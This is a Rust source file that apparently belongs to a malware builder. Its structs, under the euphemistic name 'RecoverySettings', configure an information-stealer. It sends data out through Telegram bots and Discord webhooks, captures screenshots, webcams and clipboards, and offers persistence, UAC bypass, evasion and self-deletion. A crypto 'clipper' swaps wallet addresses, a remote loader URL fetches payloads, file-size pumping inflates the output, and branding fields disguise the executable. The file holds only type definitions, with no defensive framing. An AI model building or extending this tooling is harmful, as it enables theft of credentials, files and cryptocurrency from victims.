use serde::{Deserialize, Serialize};
use std::collections::HashSet;

#[derive(Serialize)]
pub struct SettingsFile {
    pub name: String,
    pub path: String,
    pub is_default: bool,
}

#[derive(Serialize)]
pub struct BuildResult {
    pub success: bool,
    pub output: String,
    pub exe_path: Option<String>,
    pub moved_to: Option<String>,
}

#[derive(Debug, Deserialize)]
pub struct BrandingSettings {
    pub icon_source: Option<String>,
    pub icon_preset: Option<String>,
    pub product_name: Option<String>,
    pub file_description: Option<String>,
    pub company_name: Option<String>,
    pub product_version: Option<String>,
    pub file_version: Option<String>,
    pub copyright: Option<String>,
}

#[derive(Debug, Deserialize, Clone)]
pub struct RecoverySettings {
    pub allowed_categories: Vec<String>,
    pub artifact_key: Option<String>,
    pub archive_password: Option<String>,
    pub telegram_token: Option<String>,
    pub telegram_chat_id: Option<String>,
    pub discord_webhook: Option<String>,
    pub capture_screenshots: Option<bool>,
    pub capture_webcams: Option<bool>,
    pub capture_clipboard: Option<bool>,
    pub persistence: Option<bool>,
    pub uac_bypass: Option<bool>,
    pub evasion: Option<bool>,
    pub clipper: Option<bool>,
    pub melt: Option<bool>,
    pub loader_url: Option<String>,
    pub btc_address: Option<String>,
    pub eth_address: Option<String>,
    pub ltc_address: Option<String>,
    pub xmr_address: Option<String>,
    pub doge_address: Option<String>,
    pub dash_address: Option<String>,
    pub sol_address: Option<String>,
    pub trx_address: Option<String>,
    pub ada_address: Option<String>,
    pub pump_size_mb: Option<u32>,
    pub blocked_countries: Option<Vec<String>>,
    pub custom_extensions: Option<Vec<String>>,
    pub custom_keywords: Option<Vec<String>>,
    pub proxy_server: Option<String>,
    pub standalone: Option<bool>,
    pub debug: Option<bool>,
}

#[derive(Debug, Serialize)]
pub struct PayloadConfig {
    pub allowed_categories: Option<HashSet<String>>,
    pub artifact_key: Option<String>,
    pub capture_screenshots: Option<bool>,
    pub capture_webcams: Option<bool>,
    pub capture_clipboard: Option<bool>,
    pub persistence_enabled: Option<bool>,
    pub uac_bypass_enabled: Option<bool>,
    pub evasion_enabled: Option<bool>,
    pub clipper_enabled: Option<bool>,
    pub melt_enabled: Option<bool>,
    pub btc_address: Option<String>,
    pub eth_address: Option<String>,
    pub ltc_address: Option<String>,
    pub xmr_address: Option<String>,
    pub doge_address: Option<String>,
    pub dash_address: Option<String>,
    pub sol_address: Option<String>,
    pub trx_address: Option<String>,
    pub ada_address: Option<String>,
    pub telegram_token: Option<String>,
    pub telegram_chat_id: Option<String>,
    pub discord_webhook: Option<String>,
    pub loader_url: Option<String>,
    pub proxy_server: Option<String>,
    pub pump_size_mb: Option<u32>,
    pub blocked_countries: Option<HashSet<String>>,
    pub custom_extensions: Option<HashSet<String>>,
    pub custom_keywords: Option<HashSet<String>>,
    pub debug_enabled: Option<bool>,
    pub archive_password: Option<String>,
}

#[derive(Debug, Deserialize)]
pub struct BuildRequest {
    pub settings: RecoverySettings,
    pub branding: Option<BrandingSettings>,
    pub output_dir: Option<String>,
}
